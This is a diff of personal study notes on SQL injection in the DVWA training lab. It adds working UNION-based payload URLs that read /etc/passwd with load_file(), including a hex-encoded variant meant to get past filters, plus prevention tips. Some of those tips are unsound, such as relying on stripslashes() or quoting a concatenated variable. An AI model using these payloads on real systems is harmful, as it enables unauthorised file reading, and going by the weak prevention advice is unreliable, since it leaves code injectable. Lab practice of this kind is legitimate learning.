@@ -6,13 +6,26 @@ To avoid SQL injection flaws, developers need to:
 See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html  
 
 -> How to read files with SQL injection
-The 
+  Use DVWA (<metasploitable IP> then choose DVWA with admin/password) and put the DVWA Security to medium.
+  The load_file() function in SQL is used to retrieve a file. Let's try to use it in the URL:
+    <ms IP>/dvwa/vulnerabilities/sqli/?id=1 union select load_file('/etc/passwd'),2 from information_schema.columns 
+      where table_schema=0x64767761 %23&Submit=Submit#
+  >>> of course, that does not work due to filters.
+  So, let's try to encode "/etc/passwd" in hexa using https://www.rapidtables.com/convert/number/ascii-to-hex.html
+  >>> "/etc/passwd" gives 2F 65 74 63 2F 70 61 73 73 77 64 or 0x2F6574632F706173737764
+  Try it: <mp IP>/dvwa/vulnerabilities/sqli/?id=1 union select load_file(0x2F6574632F706173737764),2 from information_schema.columns
+            where%20table_schema=0x64767761 %23&Submit=Submit#
+  That works !!
+
 -> How to prevent SQL injection
-  -Use real_escape_string() function in PHP.
-    Example if the password is "pwd' OR 1=1 #", it becomes "pwd \' OR 1=1 \#', a simple string.
+  -Use real_escape_string() function in PHP code.
+     Example if the password is "pwd' OR 1=1 #", it becomes "pwd \' OR 1=1 \#', a simple string.
+  -Use stripslashes() function in PHP code.
+  -Use is_numeric() in PHP code to be sure the ID is numerical, not a string.
+  -Use "'" around variable name in PHP. Example: $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";  
   -Stop writing dynamic queries with string concatenation.
   -Prevent malicious SQL input from being included in executed queries.
-  -Do not display SQL errors to the client/user. Be blind !!
+  -Do not display SQL error to the client/user. Be blind !!
 
 >@################################################################################################################################################
 >@#                                                                                                                                              #
@@ -36,11 +49,27 @@ The
 >@#----------------------------------------------------------------------------------------------------------------------------------------------- 
 >@
 >@-> How to read files with SQL injection
->@
+>@  Use DVWA (<metasploitable IP> then choose DVWA with admin/password) and put the DVWA Security to medium.
+>@  The load_file() function in SQL is used to retrieve a file. Let's try to use it in the URL:
+>@    <ms IP>/dvwa/vulnerabilities/sqli/?id=1 union select load_file('/etc/passwd'),2 from information_schema.columns 
+>@      where table_schema=0x64767761 %23&Submit=Submit#
+>@  >>> of course, that does not work due to filters.
+>@  So, let's try to encode "/etc/passwd" in hexa using https://www.rapidtables.com/convert/number/ascii-to-hex.html
+>@  >>> "/etc/passwd" gives 2F 65 74 63 2F 70 61 73 73 77 64 or 0x2F6574632F706173737764
+>@  Try it: <mp IP>/dvwa/vulnerabilities/sqli/?id=1 union select load_file(0x2F6574632F706173737764),2 from information_schema.columns
+>@            where%20table_schema=0x64767761 %23&Submit=Submit#
+>@  That works !!
 >@
 >@-> How to prevent SQL injection
 >@  -Use real_escape_string() function in PHP.
->@    Example if the password is "pwd' OR 1=1 #", it becomes "pwd \' OR 1=1 \#', a simple string.
+>@
+>@-> How to prevent SQL injection
+>@-> How to prevent SQL injection
+>@  -Use real_escape_string() function in PHP code.
+>@     Example if the password is "pwd' OR 1=1 #", it becomes "pwd \' OR 1=1 \#', a simple string.
+>@  -Use stripslashes() function in PHP code.
+>@  -Use is_numeric() in PHP code to be sure the ID is numerical, not a string.
+>@  -Use "'" around variable name in PHP. Example: $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";  
 >@  -Stop writing dynamic queries with string concatenation.
 >@  -Prevent malicious SQL input from being included in executed queries.
 >@  -Do not display SQL error to the client/user. Be blind !!
